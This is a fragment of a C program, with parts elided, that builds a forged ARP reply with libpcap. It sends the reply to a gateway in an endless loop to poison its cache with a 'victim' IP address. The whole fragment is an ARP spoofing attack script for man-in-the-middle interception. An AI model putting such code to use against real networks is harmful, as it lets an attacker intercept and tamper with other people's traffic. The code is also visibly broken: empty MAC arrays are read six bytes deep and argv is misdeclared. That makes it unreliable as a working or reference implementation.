...
int main(int argc, char **argv[])
{
    ...
    // send target so that target send to victim
    u_char packet3[100];
    memset(packet3, 0x00, 100);

    // make packet
    u_char target_mac[] = { };	// gateway mac
    u_char sender_mac[] = {0x00, 0x0c, 0x29, 0x32, 0xaa, 0xb5};
    u_char ether_type_3[] = { 0x08, 0x06 }; //ARP
    u_char Hardware_Type_3[] = { 0x00, 0x01 };         //ETHERNET
    u_char Protocol_Type_3[] = { 0x08, 0x00 };         //IP
    u_char Hardware_Size_3[] = { 0x06 };
    u_char Protocol_Size_3[] = { 0x04 };
    u_char Opcode_3[] = { 0x00, 0x02 };
    u_char sender_mac_3[] = {0x00, 0x0c, 0x29, 0x32, 0xaa, 0xb5}; // victim mac
    u_char sender_ip_3[] = {0xc0, 0xa8, 0xcb, 0x81};		// victim ip 192.168.203.1
    u_char target_mac_3[] = {};   // gateway mac
    u_char target_ip_3[] = {0xc0, 0xa8, 0xcb, 0x01};

    i=0;

    for(i=0; i<6; i++) packet3[i] = target_mac[i];
    for(i=6; i<12; i++) packet3[i] = sender_mac[i-6];
    for(i=12; i<14; i++) packet3[i] = ether_type_3[i-12];
    for(i=14; i<16; i++) packet3[i] = Hardware_Type_3[i-14];
    for(i=16; i<18; i++) packet3[i] = Protocol_Type_3[i-16];
    for(i=18; i<19; i++) packet3[i] = Hardware_Size_3[0];
    for(i=19; i<20; i++) packet3[i] = Protocol_Size_3[0];
    for(i=20; i<22; i++) packet3[i] = Opcode_3[i-20];
    for(i=22; i<28; i++) packet3[i] = sender_mac_3[i-22];
    for(i=28; i<32; i++) packet3[i] = sender_ip_3[i-28];
    for(i=32; i<38; i++) packet3[i] = target_mac_3[i-32];
    for(i=38; i<42; i++) packet3[i] = target_ip_3[i-38];

    printf("Send packet to Gateway\n");

    // if victim request

    while(1)
    {
        if (pcap_sendpacket(handle, packet3, sizeof( packet3)) != 0)
            printf("error\n");
    }
}
